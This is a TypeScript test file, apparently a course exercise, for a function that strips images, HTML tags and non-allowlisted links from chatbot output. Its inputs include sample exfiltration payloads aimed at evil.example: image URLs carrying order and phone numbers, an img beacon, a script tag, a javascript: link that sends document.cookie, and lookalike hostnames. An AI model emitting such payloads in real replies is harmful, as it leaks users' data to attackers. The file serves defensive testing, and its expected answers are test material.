import '../../helpers/offline.ts'
import test from 'node:test'
import assert from 'node:assert/strict'
import { sanitizeOutput } from './ex3.ts'

const ALLOWED = ['shop.example', 'www.shop.example']

test('Markdown 圖片：http 和 https 都整段移除', () => {
  assert.equal(sanitizeOutput('您的訂單已確認。![優惠](https://evil.example/p.png?o=訂單12345)', ALLOWED), '您的訂單已確認。', '外部圖片一顯示瀏覽器就會發出請求，把網址裡的資料送出去：整段移除')
  assert.equal(sanitizeOutput('A![x](http://evil.example/a.png)B', ALLOWED), 'AB', 'http: 的圖片也要移除')
  assert.equal(sanitizeOutput('A![菜單](https://shop.example/menu.png)B', ALLOWED), 'AB', '允許的網域的圖片也一樣移除（題目規定所有圖片都移除）')
})

test('HTML 標籤：<img>、<script> 等都移除，中間的文字留著', () => {
  const out = sanitizeOutput('好的<img src="https://evil.example/?q=0912345678">，<b>拿鐵</b> 110 元<script>steal()</script>', ALLOWED)
  assert.doesNotMatch(out, /<\s*\/?\s*[a-z]/i, `不能留下任何 HTML 標籤：${out}`)
  assert.equal(out, '好的，拿鐵 110 元steal()', '移除標籤本身，標籤之間的文字保留（之後前端會當純文字顯示）')
})

test('連結：允許的網域保留，其他只留文字', () => {
  assert.equal(sanitizeOutput('看[菜單](https://shop.example/menu)', ALLOWED), '看[菜單](https://shop.example/menu)', 'shop.example 在白名單裡，連結保留原樣')
  assert.equal(sanitizeOutput('[會員](https://www.shop.example/member)', ALLOWED), '[會員](https://www.shop.example/member)', 'www.shop.example 也在白名單裡')
  assert.equal(sanitizeOutput('[領優惠](https://evil.example/?phone=0912345678)', ALLOWED), '領優惠', '不在白名單的網域：只留文字')
})

test('主機名稱要完全相等，不能用字串包含判斷', () => {
  for (const url of [
    'https://shop.example.evil.com/coupon',
    'https://evil.example/?next=shop.example',
    'https://shop.example@evil.example/',
    'https://evilshop.example/',
  ]) {
    assert.equal(sanitizeOutput(`[點這裡](${url})`, ALLOWED), '點這裡', `${url} 的主機不是 shop.example：用 new URL(url).hostname 比對完整名稱`)
  }
})

test('javascript:、http:、相對網址的連結只留文字', () => {
  assert.equal(sanitizeOutput('[按我](javascript:location=`https://evil.example/?c=`+document.cookie)', ALLOWED), '按我', 'javascript: 連結一點就執行程式，要移除')
  assert.equal(sanitizeOutput('[菜單](http://shop.example/menu)', ALLOWED), '菜單', '只允許 https:')
  assert.equal(sanitizeOutput('[菜單](/menu)', ALLOWED), '菜單', '相對網址解析不了（new URL 會丟錯），只留文字')
})

test('一般文字不變、每一個都處理', () => {
  const plain = '拿鐵 110 元，可改燕麥奶（加 10 元）。'
  assert.equal(sanitizeOutput(plain, ALLOWED), plain, '沒有圖片、標籤、連結時原樣回傳')
  const out = sanitizeOutput('![a](https://e.example/1)[x](https://e.example/2)![b](https://e.example/3)[y](https://shop.example/4)', ALLOWED)
  assert.equal(out, 'x[y](https://shop.example/4)', '每一個圖片、每一個連結都要處理（g）')
})

test('白名單用參數傳進來的 allowedHosts，不能寫死', () => {
  assert.equal(sanitizeOutput('[菜單](https://shop.example/menu)、[部落格](https://blog.example/)', ['blog.example']), '菜單、[部落格](https://blog.example/)', 'allowedHosts 換成 [\'blog.example\'] 時，只有 blog.example 的連結保留')
  assert.equal(sanitizeOutput('[菜單](https://shop.example/menu)', []), '菜單', 'allowedHosts 是空陣列時，所有連結都只留文字')
})
